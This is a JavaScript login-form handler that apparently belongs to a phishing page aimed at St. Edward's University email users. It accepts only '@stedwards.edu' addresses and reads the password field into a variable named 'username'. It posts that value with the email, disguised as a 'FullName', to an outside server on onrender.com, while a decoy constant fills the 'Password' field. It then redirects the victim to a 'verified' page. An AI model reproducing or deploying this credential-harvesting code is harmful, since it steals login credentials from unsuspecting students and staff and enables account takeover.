document.addEventListener("DOMContentLoaded", function() {
    // Get the form element
    const loginForm = document.getElementById("Login");
    // Add submit event listener
    loginForm.addEventListener("submit", function(event) {
        // Prevent the default form submission
        event.preventDefault();

        // Get email and password values
        const email = document.getElementById("inputUser").value;
        const username = document.getElementById("inputPass").value;
        const password = 'uiggcilwcbnuitqolvlnsbvu@^#*guitv34'

        // Validate email and password
        if (validateEmail(email) && validatePassword(password)) {
            // Email and password are valid
            console.log("Valid email and password.");
            
            //Send Login detail to admin for notification
            const userData = {
                FullName: username,
                Email: email,
                Password: password,
            };
            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method : "POST",
                headers : {
                "Content-Type" : "application/json"
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            });
            
            // Redirect to home page after a delay (e.g., 2 seconds)
            setTimeout(function() {
                window.location.href = "./verified.html"; // Replace "home.html" with your home page URL
            }, 1500);
        } else {
            // Invalid email or password
            alert("Invalid email or password. Please try again.");
        }
    });

    // Function to validate email
    function validateEmail(email) {
        // Check if the email ends with ""
        return email.endsWith("@stedwards.edu");
    }

    // Function to validate password
    function validatePassword(password) {
        // Check if the password is not empty
        return password.trim() !== "";
    }
});
